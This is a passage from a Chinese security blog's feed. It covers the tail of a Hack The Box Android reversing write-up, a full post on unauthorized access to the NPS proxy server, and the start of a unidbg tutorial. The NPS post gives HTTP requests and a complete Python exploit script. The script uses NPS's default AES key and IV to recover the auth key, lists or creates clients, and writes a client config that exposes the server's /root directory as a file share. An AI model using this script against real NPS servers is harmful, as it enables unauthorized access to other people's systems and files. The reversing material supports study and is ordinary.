alt="image-20220905155222110"></p><p>构造一个c代码，先输出v11，看看到底异或成啥了。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n100" mdtype="fences">#include &lt;stdio.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>int main() {<br><br>int jni_def[] = {0, 1, 0x1C, 0x6E, 0x54, 0x57, 0x51, 0x64, 0xAB, 7,<br>                 0x98, 0x60, 0xA2, 0xE6, 0xB3, 1, 0xEB, 0xC1, 0x19,<br>                 0xB4, 0x39, 0xE, 0x74, 0xA1, 0x79, 0xE3, 0xE9, 0x50,<br>                 0x9B, 0xE2, 0x5D, 0x9E, 0x7C, 0x67, 0x64, 0x64, 0x14,<br>                 0x64, 0x64, 0x64, 0x1C, 0x32, 0x50, 0x76, 0x64, 0x64,<br>                 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x1C, 0x66, 0x64,<br>                 0x64, 0x6B, 0x64, 0x64, 0x64, 0x14, 0x64, 0x64, 0x64,<br>                 0x63, 0x64, 0x64, 0x64, 0xC8, 0x64, 0x64, 0x64, 0x67,<br>                 0x64, 0x64, 0x64, 0xAC, 0x64, 0x64, 0x64, 0x65, 0x64,<br>                 0x64, 0x64, 0x88, 0x64, 0x64, 0x64, 0x61, 0x64, 0x64,<br>                 0x64, 0x90, 0x64, 0x64, 0x64, 0x65, 0x64, 0x64, 0x64,<br>                 0x78, 0x65, 0x64, 0x64, 0xB8, 0x65, 0x64, 0x64, 0x58,<br>                 0x65, 0x64, 0x64, 0xFE, 0x65, 0x64, 0x64, 0xC6, 0x65,<br>                 0x64, 0x64, 0xD0, 0x65, 0x64, 0x64, 0xAF, 0x65, 0x64,<br>                 0x64, 0xBB, 0x65, 0x64, 0x64, 0x97, 0x65, 0x64, 0x64,<br>                 0x63, 0x66, 0x64, 0x64, 0x68, 0x66, 0x64, 0x64, 0x6B,<br>                 0x66, 0x64, 0x64, 0x77, 0x66, 0x64, 0x64, 0x4C, 0x66,<br>                 0x64, 0x64, 0x50, 0x66, 0x64, 0x64, 0x5A, 0x66, 0x64,<br>                 0x64, 0x20, 0x66, 0x64, 0x64, 0x2D, 0x66, 0x64, 0x64,<br>                 0x66, 0x64, 0x64, 0x64, 0x67, 0x64, 0x64, 0x64, 0x60,<br>                 0x64, 0x64, 0x64, 0x61, 0x64, 0x64, 0x64, 0x62, 0x64,<br>                 0x64, 0x64, 0x63, 0x64, 0x64, 0x64, 0x6D, 0x64, 0x64,<br>                 0x64, 0x63, 0x64, 0x64, 0x64, 0x61, 0x64, 0x64, 0x64,<br>                 0x64, 0x64, 0x64, 0x64, 0x6C, 0x64, 0x64, 0x64, 0x61,<br>                 0x64, 0x64, 0x64, 0xE8, 0x65, 0x64, 0x64, 0x6C, 0x64,<br>                 0x64, 0x64, 0x61, 0x64, 0x64, 0x64, 0xF0, 0x65, 0x64,<br>                 0x64, 0x67, 0x64, 0x64, 0x64, 0x69, 0x64, 0x64, 0x64,<br>                 0x64, 0x64, 0x65, 0x64, 0x6A, 0x64, 0x64, 0x64, 0x65,<br>                 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x60, 0x64,<br>                 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x60, 0x64, 0x64,<br>                 0x64, 0x6F, 0x64, 0x64, 0x64, 0x60, 0x64, 0x66, 0x64,<br>                 0x68, 0x64, 0x64, 0x64, 0x60, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0x64, 0x64, 0x65, 0x64, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0x64, 0x6E, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0, 0x66, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64,<br>                 0x65, 0x64, 0x65, 0x64, 0x65, 0x64, 0x64, 0x64, 0x36,<br>                 0x66, 0x64, 0x64, 0x60, 0x64, 0x64, 0x64, 0x14, 0x74,<br>                 0x65, 0x64, 0x64, 0x64, 0x6A, 0x64, 0x66, 0x64, 0x64,<br>                 0x64, 0x66, 0x64, 0x64, 0x64, 0x33, 0x66, 0x64, 0x64,<br>                 0x6C, 0x64, 0x64, 0x64, 6, 0x64, 0x64, 0x64, 0x7E,<br>                 0x65, 0x65, 0x64, 0xA, 0x44, 0x64, 0x64, 0x74, 0x64,<br>                 0x6A, 0x64, 0x65, 0x64, 0x65, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0x39, 0x66, 0x64, 0x64, 0x60, 0x64, 0x64, 0x64,<br>                 0x15, 0x64, 0x67, 0x64, 0x64, 0x64, 0x6A, 0x64, 0x65,<br>                 0x64, 0x64, 0x64, 0x66, 0x64, 0x64, 0x64, 0x65, 0x64,<br>                 0x64, 0x64, 0x62, 0x64, 0x62, 0x58, 0xD, 0xA, 0xD,<br>                 0x10, 0x5A, 0x64, 0x74, 0x2C, 0x30, 0x26, 0x1F, 0x37,<br>                 5, 0x13, 0x37, 0x54, 0x20, 0x27, 0x28, 0xD, 0xA, 3,<br>                 0x19, 0x64, 0x71, 0x28, 0xE, 5, 0x12, 5, 0x4B, 0xD,<br>                 0xB, 0x4B, 0x34, 0x16, 0xD, 0xA, 0x10, 0x37, 0x10,<br>                 0x16, 1, 5, 9, 0x5F, 0x64, 0x76, 0x28, 0xE, 5, 0x12,<br>                 5, 0x4B, 8, 5, 0xA, 3, 0x4B, 0x2B, 6, 0xE, 1, 7, 0x10,<br>                 0x5F, 0x64, 0x76, 0x28, 0xE, 5, 0x12, 5, 0x4B, 8, 5,<br>                 0xA, 3, 0x4B, 0x37, 0x10, 0x16, 0xD, 0xA, 3, 0x5F,<br>                 0x64, 0x76, 0x28, 0xE, 5, 0x12, 5, 0x4B, 8, 5, 0xA,<br>                 3, 0x4B, 0x37, 0x1D, 0x17, 0x10, 1, 9, 0x5F, 0x64,<br>                 0x67, 0x28, 0x1C, 0x5F, 0x64, 0x65, 0x32, 0x64, 0x66,<br>                 0x32, 0x28, 0x64, 0x77, 0x3F, 0x28, 0xE, 5, 0x12, 5,<br>                 0x4B, 8, 5, 0xA, 3, 0x4B, 0x37, 0x10, 0x16, 0xD, 0xA,<br>                 3, 0x5F, 0x64, 0x6E, 5, 6, 7, 0, 1, 0x4A, 0xE, 5, 0x12,<br>                 5, 0x64, 0x6C, 8, 0xB, 3, 0x14, 0x16, 0xD, 0xA, 0x10,<br>                 0x64, 0x60, 9, 5, 0xD, 0xA, 0x64, 0x67, 0xB, 0x11,<br>                 0x10, 0x64, 0x63, 0x14, 0x16, 0xD, 0xA, 0x10, 8, 0xA,<br>                 0x64, 0x65, 0x64, 0x63, 0x6A, 0x64, 0x60, 0x64, 0x63,<br>                 0x6A, 0x1C, 0x64, 0x63, 0x65, 0x64, 0x63, 0x6A, 0x58,<br>                 0x64, 0x64, 0x64, 0x67, 0x64, 0x66, 0xE4, 0xE4, 0x60,<br>                 0xD8, 0x66, 0x65, 0x6D, 0xB0, 0x66, 0x65, 0x6D, 0x90,<br>                 0x66, 0x64, 0x64, 0x69, 0x64, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0x64, 0x65, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64,<br>                 0x64, 0x65, 0x64, 0x64, 0x64, 0x6B, 0x64, 0x64, 0x64,<br>                 0x14, 0x64, 0x64, 0x64, 0x66, 0x64, 0x64, 0x64, 0x63,<br>                 0x64, 0x64, 0x64, 0xC8, 0x64, 0x64, 0x64, 0x67, 0x64,<br>                 0x64, 0x64, 0x67, 0x64, 0x64, 0x64, 0xAC, 0x64, 0x64,<br>                 0x64, 0x60, 0x64, 0x64, 0x64, 0x65, 0x64, 0x64, 0x64,<br>                 0x88, 0x64, 0x64, 0x64, 0x61, 0x64, 0x64, 0x64, 0x61,<br>                 0x64, 0x64, 0x64, 0x90, 0x64, 0x64, 0x64, 0x62, 0x64,<br>                 0x64, 0x64, 0x65, 0x64, 0x64, 0x64, 0x78, 0x65, 0x64,<br>                 0x64, 0x65, 0x44, 0x64, 0x64, 0x67, 0x64, 0x64, 0x64,<br>                 0x58, 0x65, 0x64, 0x64, 0x65, 0x74, 0x64, 0x64, 0x66,<br>                 0x64, 0x64, 0x64, 0xE8, 0x65, 0x64, 0x64, 0x66, 0x44,<br>                 0x64, 0x64, 0x6B, 0x64, 0x64, 0x64, 0xFE, 0x65, 0x64,<br>                 0x64, 0x67, 0x44, 0x64, 0x64, 0x67, 0x64, 0x64, 0x64,<br>                 0x36, 0x66, 0x64, 0x64, 0x64, 0x44, 0x64, 0x64, 0x65,<br>                 0x64, 0x64, 0x64, 0, 0x66, 0x64, 0x64, 0x64, 0x74,<br>                 0x64, 0x64, 0x65, 0x64, 0x64, 0x64, 0x1C, 0x66, 0x64,<br>                 0x64<br>                };<br><br>char v11[800];<br>char *a1 = &#34;/data/user/0/com.stego.saw/&#34;;<br>int v5;<br>char *v6;  // r5<br>char *v7; // r0<br>FILE *v8; // r0<br>FILE *v9;<br><br>for ( int i = 0; i != 792; ++i )<br>v11[i] = jni_def[i] ^ 0x64;<br>printf(v11);<br>v5 = strlen(a1);<br>v6 = calloc(v5 + 2, 1u);<br>v7 = strcpy(v6, a1);<br>* &amp;v6[strlen(v7)] = 104;<br>v8 = fopen(v6, &#34;wb&#34;);<br>if ( !v8 )<br>return 0;<br>v9 = v8;<br>for ( int j = 0; j != 792; ++j )<br>fputc(v11[j], v9);<br>fclose(v9);<br>return 1;<br>}</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759352.png" alt="image-20220905155340979"></p><p>应该是生成一个dex文件，但是由于我是本机去运行，不能按照上面的a1进行写文件，需要重新赋值修改a1的值。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n106" mdtype="fences">char *a1 = &#34;file&#34;;</pre><p>运行后在当前文件目录生成一个fileh文件，打开即可看到里面的flag。<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202209051759353.png" alt="image-20220905155543596"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;APKey&quot;&gt;&lt;a href=&quot;#APKey&quot; class=&quot;headerlink&quot; title=&quot;APKey&quot;&gt;&lt;/a&gt;APKey&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://app.hackthebox.com/5a438e22-07d2-4f61-9ab
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>NPS未授权访问</title>
    <link href="https://misakikata.github.io/2022/08/NPS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://misakikata.github.io/2022/08/NPS未授权访问/</id>
    <published>2022-08-16T07:33:13.000Z</published>
    <updated>2022-08-16T07:52:40.592Z</updated>
    
    <content type="html"><![CDATA[<h3 id="nps未授权访问"><a href="#nps未授权访问" class="headerlink" title="nps未授权访问"></a>nps未授权访问</h3><p>根据GitHub上的脚本，得知auth_key基本都是本地MD5加密得来的，但在一些系统上测试失败，后来发现是本地和服务器的时间有问题，所以查了一下文档，发现有直接获取时间戳和加密密钥的地方。</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;auth&#x2F;gettime HTTP&#x2F;1.1Host: 192.168.70.250:18080Content-Length: 7Connection: closeCookie:beegosessionID&#x3D;xxxxx​search&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回一个json字段，里面包含服务器的时间戳。</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;auth&#x2F;getauthkey HTTP&#x2F;1.1Host: 192.168.70.250:18080Content-Length: 7Connection: closeCookie:beegosessionID&#x3D;xxxxx​search&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回加密的auth_key，这个key是配置文件内的key，也就是默认为注释掉的那个。并不能直接拿来使用，如果这个值为<code>5acabcf051cd55abca03d18294422e01</code>，说明为空，如果为其他说明被修改过，这时候就要算auth_crypt_key的值是不是也被修改了，如果没有则可以</p><pre class="line-numbers language-none"><code class="language-none">AES-CBC pkcs5 128位 key&#x3D;1234567812345678 iv&#x3D;1234567812345678 hex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行解密，也就是说至少要有一个auth_crypt_key没被修改或已知。</p><p>如果到此处可以未授权访问，那么就可以查看客户端信息，来获取VerifyKey，获取这个东西目的是为了把客户吨连接到服务端。也就是返回中的这一段值</p><pre class="line-numbers language-none"><code class="language-none">&quot;Id&quot;: 2,    &quot;VerifyKey&quot;: &quot;6sabs7dyn4rf1oob&quot;,    &quot;Addr&quot;: &quot;192.168.70.250&quot;,    &quot;Remark&quot;: &quot;&quot;,    &quot;Status&quot;: true,    &quot;IsConnect&quot;: true,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造一个配置文件，其中的8024位默认的端口，需要在服务端的配置文件中修改，不对的话没事，访问首页去查看一下就行。</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr&#x3D;1.1.1.1:8024vkey&#x3D;123[file]mode&#x3D;fileserver_port&#x3D;9100local_path&#x3D;&#x2F;root&#x2F;strip_pre&#x3D;&#x2F;web&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以把客户端加入，并且构造了一个访问服务端文件的地址。地址就会映射到本地文件系统上。</p><pre class="line-numbers language-none"><code class="language-none">xxx:9100&#x2F;web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编写一个脚本来统一这个过程。</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-# @Time    : 2022&#x2F;8&#x2F;16 14:13# @Author  : misakikata# @File    : nps_bypass.py# @Description : autoremove​​import argparseimport requestsimport json,sysimport hashlibfrom Crypto.Cipher import AES# from urllib.parse import urlparsefrom binascii import a2b_hexrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)​​​headers &#x3D; &#123;    &quot;Cookie&quot;:&quot;beegosessionID&#x3D;2313ba62226729bf9bb0b9680da80a5f&quot;,    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;104.0.0.0 Safari&#x2F;537.36&quot;,    &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;,    &quot;Accept&quot;:&quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;&#125;​file_w &#x3D; &quot;&quot;&quot;[common]server_addr&#x3D;&#123;host&#125;:8024vkey&#x3D;&#123;vkey&#125;[file]mode&#x3D;fileserver_port&#x3D;9100local_path&#x3D;&#x2F;root&#x2F;strip_pre&#x3D;&#x2F;web&#x2F;&quot;&quot;&quot;​def get_time(host):    url &#x3D; host + &quot;&#x2F;auth&#x2F;gettime&quot;    r &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;&#123;&quot;search&quot;:&quot;&quot;&#125;)    time &#x3D; json.loads(r.text)[&#39;time&#39;]    return time​​def gen_authkey(authkey, timestamp):    mdf &#x3D; hashlib.md5()    mdf.update((authkey+str(timestamp)).encode(&#39;utf-8&#39;))    auth_key &#x3D; mdf.hexdigest()    return auth_key​​def get_key(host):    url &#x3D; host + &quot;&#x2F;auth&#x2F;getauthkey&quot;    r &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;&#123;&quot;search&quot;: &quot;&quot;&#125;)    key &#x3D; json.loads(r.text)[&#39;crypt_auth_key&#39;]    if key &#x3D;&#x3D; &quot;5acabcf051cd55abca03d18294422e01&quot;:        authkey &#x3D; &quot;&quot;    else:        if deco_key(&quot;1234567812345678&quot;, key):            authkey &#x3D; deco_key(&quot;1234567812345678&quot;, key)        else:            return False    return authkey​def add_to_16(value):    while len(value.encode(&#39;utf-8&#39;)) % 16 !&#x3D; 0:        value +&#x3D; &#39;\x00&#39;    return value.encode(&#39;utf-8&#39;)​def deco_key(key0,data):    try:        aes &#x3D; AES.new(key&#x3D;add_to_16(key0), mode&#x3D;AES.MODE_CBC, iv&#x3D;key0.encode())        decryptedstr &#x3D; aes.decrypt(a2b_hex(data)).decode().strip()        return decryptedstr    except:        return False​​def gen_conf(host, vkey):    host &#x3D; host.split(&#39;:&#39;)[0:2]    file &#x3D; file_w.format(host&#x3D;&#39;&#39;.join(host), vkey&#x3D;vkey)    with open(&quot;config.ini&quot;, &#39;w&#39;) as f:        f.write(file)    return True​def get_vkey(host, data):    url &#x3D; host + &quot;&#x2F;client&#x2F;list&quot;    r &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;data)    if r.status_code &#x3D;&#x3D; 200:        try:            vkey &#x3D; json.loads(r.text)[&#39;rows&#39;][0][&#39;VerifyKey&#39;]            return vkey        except:            if gen_client(host, data):                print(&quot;无客户端，创建客户端成功&quot;)                r &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;data)                vkey &#x3D; json.loads(r.text)[&#39;rows&#39;][0][&#39;VerifyKey&#39;]                return vkey            else:                return False    else:        return False​​def gen_client(host, data):    url &#x3D; host + &quot;&#x2F;client&#x2F;add&quot;    data &#x3D; &quot;remark&#x3D;&amp;u&#x3D;&amp;p&#x3D;&amp;vkey&#x3D;&amp;config_conn_allow&#x3D;1&amp;compress&#x3D;0&amp;crypt&#x3D;0&amp;&quot;+data    r &#x3D; requests.post(url, headers&#x3D;headers, data&#x3D;data)    if r.status_code &#x3D;&#x3D; 200:        if json.loads(r.text)[&#39;status&#39;] &#x3D;&#x3D; 1:            return True    return False​def main(host):    times &#x3D; get_time(host)    if get_key(host):        getkey &#x3D; get_key(host)    else:        print(host+&quot; 解密失败!&quot;)        sys.exit(0)    auth_key &#x3D; gen_authkey(getkey, times)    data &#x3D; &quot;auth_key&#x3D;&#123;auth_key&#125;&amp;timestamp&#x3D;&#123;timestamp&#125;&amp;start&#x3D;0&amp;limit&#x3D;10&quot;.format(auth_key&#x3D;auth_key,timestamp&#x3D;times)    r &#x3D; requests.post(host, headers&#x3D;headers, data&#x3D;data)    if r.status_code &#x3D;&#x3D; 200:        print(host+&quot; is vuln!&quot;)        if get_vkey(host, data):            vkey &#x3D; get_vkey(host, data)            if gen_conf(host, vkey):                print(&quot;请运行nps客户端命令：.&#x2F;npc -config&#x3D;config.ini，并访问&#123;host&#125;:9100&#x2F;web&quot;.format(host&#x3D;&#39;&#39;.join(host.split(&#39;:&#39;)[0:2])))        else:            print(&quot;未创建客户端或者获取失败！&quot;)    else:        print(host+&quot; not is vuln!&quot;)​if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    parser &#x3D; argparse.ArgumentParser(        description&#x3D;&quot;NPS Bypass&quot;)    parser.add_argument(&#39;-u&#39;, &#39;--url&#39;, type&#x3D;str,                        help&#x3D;&quot;单个url检测，默认密钥进行解密&quot;)    args &#x3D; parser.parse_args()​    if len(sys.argv) &#x3D;&#x3D; 3:        if sys.argv[1] in [&#39;-u&#39;, &#39;--url&#39;]:            main(args.url)    else:        parser.print_help()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;nps未授权访问&quot;&gt;&lt;a href=&quot;#nps未授权访问&quot; class=&quot;headerlink&quot; title=&quot;nps未授权访问&quot;&gt;&lt;/a&gt;nps未授权访问&lt;/h3&gt;&lt;p&gt;根据GitHub上的脚本，得知auth_key基本都是本地MD5加密得来的，但在一些系统上测
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Unidbg运行SO</title>
    <link href="https://misakikata.github.io/2022/07/Unidbg%E8%BF%90%E8%A1%8CSO/"/>
    <id>https://misakikata.github.io/2022/07/Unidbg运行SO/</id>
    <published>2022-07-09T11:56:03.000Z</published>
    <updated>2022-07-09T11:56:03.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="下载unidbg"><a href="#下载unidbg" class="headerlink" title="下载unidbg"></a>下载unidbg</h3><p>地址：<a href="https://github.com/zhkl0228/unidbg">https://github.com/zhkl0228/unidbg</a></p><p>unidbg需要在IDEA端进行调试一下，等待依赖自动安装后，运行<code>unidbg-android/src/test/java/com/bytedance/frameworks/core/encrypt/TTEncrypt.java</code>文件。如果显示如下则代表运行正常。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160655.png" alt="image-20220708143215761"></p><p>使用一个基础的模板，后续可以根据此模板来进行修改</p><pre class="line-numbers language-none"><code class="language-none">public SignUtil() &#123;       emulator &#x3D; AndroidEmulatorBuilder.for32Bit()               .setProcessName(&quot;com.anjuke.android.app&quot;)               .build();       Memory memory &#x3D; emulator.getMemory();       memory.setLibraryResolver(new AndroidResolver(23));       vm &#x3D; emulator.createDalvikVM();       vm.setDvmClassFactory(new ProxyClassFactory());       vm.setVerbose(false);       DalvikModule dm &#x3D; vm.loadLibrary(new File(&quot;unidbg-android&#x2F;src&#x2F;test&#x2F;resources&#x2F;example_binaries&#x2F;armeabi-v7a&#x2F;libsignutil.so&quot;), false);       cSignUtil &#x3D; vm.resolveClass(&quot;com&#x2F;anjuke&#x2F;mobile&#x2F;sign&#x2F;SignUtil&quot;);       dm.callJNI_OnLoad(emulator);   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中需要注意的是：</p><ol><li>setProcessName为进程名，可以自己去赋值。</li><li>setLibraryResolver有19、23两个SDK可以选，一般使用23。</li><li>createDalvikVM的时候里面为APK的目录，可以为空。</li><li>loadLibrary为需要加载到内存的so文件。</li><li>resolveClass为调用了so加密函数的Java代码位置。</li><li>callJNI_OnLoad为调用JNI_load，有时候这个方法会报错Illegal JNI version，这是文件修不不正常导致。</li></ol><h3 id="so文件测试"><a href="#so文件测试" class="headerlink" title="so文件测试"></a>so文件测试</h3><p>先用一个吾爱老哥的文件进行一下测试使用</p><p>地址：<a href="https://www.52pojie.cn/thread-1322512-1-1.html">https://www.52pojie.cn/thread-1322512-1-1.html</a></p><p>编写一个TestJni.java，需要注意的是，这里做了一点修改，由于AndroidARMEmulator为受保护的方法，并不能直接调用，可能是unidbg做了变化，修改为AndroidEmulatorBuilder，代码为：</p><pre class="line-numbers language-none"><code class="language-none">package com.misaki;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.arm.ARMEmulator;import com.github.unidbg.arm.backend.DynarmicFactory;import com.github.unidbg.linux.android.AndroidARMEmulator;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.jni.ProxyClassFactory;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import java.io.File;import java.io.IOException;public class TestJni extends AbstractJni &#123;    &#x2F;&#x2F; ARM模拟器    private final AndroidEmulator emulator;    &#x2F;&#x2F; vm    private final VM vm;    &#x2F;&#x2F; 载入的模块    private final Module module;        private final DvmClass TTEncryptUtils;    &#x2F;**     *     * @param soFilePath   需要执行的so文件路径     * @param classPath    需要执行的函数所在的Java类路径     * @throws IOException     *&#x2F;    public TestJni(String soFilePath, String classPath) throws IOException &#123;        &#x2F;&#x2F; 创建app进程，包名可任意写        emulator &#x3D; AndroidEmulatorBuilder                        .for32Bit()                        .addBackendFactory(new DynarmicFactory(true))                        .setProcessName(&quot;com.rs&quot;)                        .build();        Memory memory &#x3D; emulator.getMemory();        &#x2F;&#x2F; 作者支持19和23两个sdk        memory.setLibraryResolver(new AndroidResolver(23));        &#x2F;&#x2F; 创建DalvikVM，利用apk本身，可以为null        vm &#x3D; emulator.createDalvikVM((File) null);        vm.setDvmClassFactory(new ProxyClassFactory());        vm.setVerbose(true);&#x2F;&#x2F;        vm.setJni(this);        &#x2F;&#x2F; （关键处1）加载so，填写so的文件路径        DalvikModule dm &#x3D; vm.loadLibrary(new File(soFilePath), false);        &#x2F;&#x2F; 调用jni, 加入此代码有可能会报错 Illegal JNI version，环境原因&#x2F;&#x2F;        dm.callJNI_OnLoad(emulator);        module &#x3D; dm.getModule();        &#x2F;&#x2F; （关键处2）加载so文件中的哪个类，填写完整的类路径        TTEncryptUtils &#x3D; vm.resolveClass(classPath);    &#125;    &#x2F;**     * 调用so文件中的指定函数     * @param methodSign 传入你要执行的函数信息，需要完整的smali语法格式的函数签名     * @param args       是即将调用的函数需要的参数     * @return 函数调用结果     *&#x2F;    private String myJni(String methodSign, Object ...args) &#123;        &#x2F;&#x2F; 使用jni调用传入的函数签名对应的方法（）        Object value &#x3D; TTEncryptUtils.callStaticJniMethodObject(emulator, methodSign, args).getValue();        return value.toString();    &#125;    &#x2F;**     * 关闭模拟器     * @throws IOException     *&#x2F;    private void destroy() throws IOException &#123;        emulator.close();        System.out.println(&quot;emulator destroy...&quot;);    &#125;    public static void main(String[] args) throws IOException &#123;        &#x2F;&#x2F; 1、需要调用的so文件所在路径        String soFilePath &#x3D; &quot;unidbg-android&#x2F;src&#x2F;test&#x2F;resources&#x2F;myso&#x2F;libinyu-lib.so&quot;;        &#x2F;&#x2F; 2、需要调用加密函数所在的Java类完整路径，比如a&#x2F;b&#x2F;c&#x2F;d等等，注意需要用&#x2F;代替点，只需要填写即可。        String classPath &#x3D; &quot;water&#x2F;android&#x2F;io&#x2F;inyustring&#x2F;InyuString&quot;;        &#x2F;&#x2F; 3、需要调用方法,再jadx中找到对应的方法，然后点击下面的Smail,复制方法的Smail代码。        String methodSign &#x3D; &quot;getUrlSign(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;String;&quot;;        TestJni testJni &#x3D; new TestJni(soFilePath, classPath);        &#x2F;&#x2F; 输出getGameKey方法调用结果        System.err.println(testJni.myJni(methodSign,&quot;&#x2F;v1&#x2F;login&#x2F;mobile&#x2F;code?mobile&#x3D;13888888888&amp;country_code&#x3D;0086&amp;__plat&#x3D;android&amp;__version&#x3D;2.21.0&amp;__app&#x3D;inyu&quot;,&quot;1607237431&quot;));        testJni.destroy();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中大部分都不需要修改，只需要修改main中的参数，classPath是加密so函数的Java代码所在类，但是并不需要实际添加进去。运行的结果如下所示。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160656.png" alt="image-20220708164633607"></p><h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p>测试APP来源猿人学的一次活动</p><p>地址：<a href="http://download.python-spider.com/yuanrenxuem106.apk">http://download.python-spider.com/yuanrenxuem106.apk</a></p><p>WP：<a href="https://mp.weixin.qq.com/s/CXsbzt4IWyDaV006JdIYsQ">https://mp.weixin.qq.com/s/CXsbzt4IWyDaV006JdIYsQ</a></p><p>先找到这个包的包名<code>com.yuanrenxue.match2022</code>，基本在这个目录下，这个app做了代码混淆，先不管。</p><p>根据提示找到<code>/app2</code>这个接口对应的代码处。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20220709160657.png" 